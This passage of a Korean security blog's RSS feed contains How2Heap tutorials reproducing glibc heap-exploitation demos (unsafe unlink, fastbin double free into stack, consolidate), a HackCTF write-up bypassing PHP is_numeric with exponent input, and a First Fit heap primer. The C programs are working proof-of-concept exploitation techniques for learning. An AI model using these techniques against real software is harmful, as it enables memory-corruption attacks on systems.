class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"바뀐 값: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[unsafe_unlink.c]</small></center><p><img src="https://user-images.githubusercontent.com/16969364/58533188-cb21ce00-8222-11e9-8f58-45c4f5c4657e.png" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533397-5ac77c80-8223-11e9-923e-14828d385b91.PNG" alt><br><img src="https://user-images.githubusercontent.com/16969364/58533399-5b601300-8223-11e9-97f1-676a43e00fdd.PNG" alt></p><p><code>unsafe unlink 2.0!</code><br><code>테스트 환경: Ubuntu 14.04/16.04 64bit</code><br>이 기법은 unlink를 호출할 수 있는 알려진 위치에 포인터가 있을 때 사용할 수 있다.<br>대부분의 시나리오는 overflow를 할 수 있고 전역 포인터를 가지고 있는 취약한 버퍼다.<br>이번 연습의 요점은 임의의 메모리를 쓰기 위해 free를 사용하여 global chunk0_ptr을 corrupt시키는 것이다.</p><p><code>global chunk0_ptr: 0x602070, pointing to 0x603010</code><br><code>corrupt할 victim chunk: 0x6030a0</code></p><p>chunk0에 fake chunk를 생성한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 next_free_chunk(fd)를 설정하여 P-&gt;fd-&gt;bk=P가 되게 한다.<br>&amp;chunk0_ptr 근처를 가리키도록 fake chunk의 previous_free_chunk(bk)를 설정하여 P-&gt;bk-&gt;fd=P가 되게 한다.<br>이 설정을 통해서 우리는 체크를 통과할 수 있다: : (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False<br><code>Fake chunk fd: 0x602058</code><br><code>Fake chunk bk: 0x602060</code></p><p>chunk0에 overflow가 발생한다고 가정한다면 우리는 chunk1의 metadata를 자유롭게 바꿀 수 있다.<br>chunk0의 크기를 줄여서(chunk1에 previous_size가 저장된) free가 chunk0이 fake chunk에 위치한 곳에서 시작한다고 생각할 것이다.<br>fake chunk가 정확히 알려진 포인터가 가리키는 곳에서 시작되고 그에 따라 chunk를 축소하는 것이 중요하다.<br>만약 우리가 일반적으로 free된 chunk0이 있다고 하면, chunk1.previous_size는 <code>0x90</code>이 될 것이다.<br>그러나 이것은 새로운 값이다: <code>0x80</code><br>chunk1의 previous_in_use를 false로 설정하여 free로 fake chunk를 표시한다.</p><p>이제 chunk1을 free해서 backward로 consolidate하면 fake chunk와 unlink될 것이고 chunk0_ptr을 overwrite한다</p><p>이 때, 우리는 chunk0_ptr을 임의의 위치를 가리키도록 overwrite해서 사용할 수 있다.<br>chunk0_ptr은 이제 우리가 원하는 곳을 가리키고 있다. 이것은 victim문자열을 overwrite하는데 사용한다.<br><code>원래 값: Hello!~</code><br><code>-------chunk0_ptr[0]=0x4141414142424242LL-------</code><br><code>바뀐 값: BBBBAAAA</code></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/29/How2Heap-unsafe-unlink-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_consolidate</title>
      <link>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/</guid>
      <pubDate>Tue, 28 May 2019 05:15:29 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_consolidatec&quot;&gt;&lt;a
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_consolidatec"><a class="markdownIt-Anchor" href="#fastbin_dup_into_consolidatec"></a> fastbin_dup_into_consolidate.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fastbin을 두개 할당한다: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()를 trigger하기 위해 largebin을 할당한다: p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc_consolidate()에서 p1은 unsorted bin으로 이동한다.\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(p1)-------\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"double free 취약점을 trigger한다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 p1이 fast-top에 있지 않기 때문에 malloc의 체크를 통과할 수 있다.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"현재 p1은 unsorted bin과 fastbin 안에 있다.\n"</span></span><br><span class="line">  <span class="string">"그래서 우리는 주소를 2번 얻을 수 있다: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_consolidate.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58452763-7cf1c980-8153-11e9-92de-1a7cd4eb43bd.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/28/How2Heap-fastbin-dup-into-consolidate-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup_into_stack</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/</guid>
      <pubDate>Mon, 27 May 2019 12:36:51 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dup_into_stackc&quot;&gt;&lt;a class
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span></span><br><span class="line"><span class="string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span></span><br><span class="line"><span class="string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span></span><br><span class="line"><span class="string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span></span><br><span class="line"><span class="string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span></span><br><span class="line"><span class="string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58422108-b4696300-80cc-11e9-9c6f-31db09f069bb.png"></p><center><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">Source</a></strong></p></center><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[How2Heap] fastbin_dup</title>
      <link>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</link>
      <guid>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/</guid>
      <pubDate>Mon, 27 May 2019 10:31:21 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;fastbin_dupc&quot;&gt;&lt;a class=&quot;markdownI
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dupc"><a class="markdownIt-Anchor" href="#fastbin_dupc"></a> fastbin_dup.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// a를 한번 더 free하면 에러가 발생한다.(free list의 top에 위치하고 있기 때문)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a); <span class="comment">// 이제 free list의 최상단에서 벗어났으니 free(a)가 가능하다.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span>, a, b, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 세 번 하면, malloc a(8)를 두번 할당할 수 있다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58414702-2931a280-80b7-11e9-9653-34ff0e49c802.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[HackCTF] Time WriteUp</title>
      <link>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/</link>
      <guid>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/</guid>
      <pubDate>Sat, 25 May 2019 09:13:01 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;time&quot;&gt;&lt;a class=&quot;markdownIt-Anchor
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="time"><a class="markdownIt-Anchor" href="#time"></a> Time</h3><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367325-e5a13200-7f18-11e9-9eca-cc9f0c363449.PNG"><small><center> [문제] </center></small><br><strong><a href="http://ctf.j0n9hyun.xyz:2032" target="_blank" rel="noopener">문제 링크</a></strong></p><p>문제에서는 is_numeric을 사용하여 숫자를 체크한다.<br>그리고 끝에는 time값을 int로 변환을 해준 뒤 나온 값의 시간이 지나면 플래그를 뱉어낸다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367417-fbfbbd80-7f19-11e9-884b-05ffb7fff365.png"><small><center> [사진 1-1] </center></small></p><p>풀기 위해서는 5184000 ~ 7776000 사이의 값을 넣어야 하는데 단순하게 생각했을 때 해당 시간동안 계속 켜놓으면 된다.<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367419-fdc58100-7f19-11e9-88fd-d66c1258e0c8.PNG" width="718px"><small><center> [사진 1-2] </center></small><br>값이 생각보다 크지 않았다면 말이다…해당 시간을 환산해보면 최소 60일동안 켜놔야 하므로 노답이다.<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="덤으로 전기세도 와장창">[1]</span></a></sup> 그래서 다른 방법을 찾아야 하는데 공식 문서에 is_numeric에 관한 설명이 기재되어 있다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367510-27cb7300-7f1b-11e9-8a21-2e9c49769604.PNG" width="718px"><small><center> [사진 2-1] </center></small><br>설명에는 변수가 임의의 자릿수, 선택적 기호, 소수, 지수로 구성될 수 있다고 한다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367511-28fca000-7f1b-11e9-9808-2c4b0dada0cb.PNG" width="150px"><small><center> [사진 2-2] </center></small><br>마찬가지로 예제에서도 모두 <strong>true</strong>로 통과하는 것을 볼 수 있다. 그렇다는 말은 즉슨, 소수점과 지수 e를 이용하면 위의 취약점을 공략할 수 있다는 소리가 된다. <br>5184000을 지수와 소수점으로 바꿔서 <strong><code>5.184000e6</code></strong> 으로 입력하면 끝에 정수(int) 형변환으로 인해 결국은 소수점 뒤에 자릿수는 모두 사라지게 되어 <strong><code>5초</code></strong> 뒤 플래그를 뱉어낸다.<br><br>원래는 16진수 값도 부분적으로 <strong>true</strong>를 반환했는데 php 7.0.0 버전부터는 16진수도 false로 반환하게끔 패치되었다. 따라서 해당 서버에는 php 7.0.0 이상의 버전을 사용하고 있다는 것도 알 수 있다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367835-e63cc700-7f1e-11e9-9774-f085a36875bf.PNG"><small><center> [FLAG] </center></small></p><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">덤으로 전기세도 와장창<a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Heap Thoery] First Fit</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</guid>
      <pubDate>Fri, 24 May 2019 05:51:30 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;first-fit&quot;&gt;&lt;a class=&quot;markdownIt-A
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="first-fit"><a class="markdownIt-Anchor" href="#first-fit"></a> First Fit</h2><p>Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다.<br>그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다.</p><p>다음의 예제를 한번 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">300</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(300) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) B : %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) A : %p\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> [Example.c] </center><p><strong>3줄 요약</strong></p><ol><li><strong>a</strong>와 <strong>b</strong>에 각각 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li><li><strong>a</strong>를 <code>free</code><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="할당해제">[2]</span></a></sup>한다.</li><li><strong>a</strong>에 다시 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li></ol><p>a에 300, b에 250 바이트가 동적 할당 되었다. 둘은 서로 다른 크기를 가지고 있는데<br>a를 free 해준 뒤 다시 재할당을 해주면 어떻게 될까?<br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png"><center> [실행 결과] </center>서로 다른 크기로 할당했지만 결과는 이전과 동일한 주소를 가리키게 된다.<br>그렇다면 남은 50 바이트는 그대로 증발되느냐? 아니다. 남은 50바이트도 여전히 남아있다.대신 a 청크가 두 개로 분리된다(300바이트 작을 경우). a1, a2 이런 식으로 말이다.<center><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a1[250]</td></tr><tr><td style="text-align:center">a2[50]</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table><h3 id="malloc250-재할당-후"><a class="markdownIt-Anchor" href="#malloc250-재할당-후"></a> ↓ malloc(250) 재할당 후</h3><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a2 (a1값 반환됨)</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table></center><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 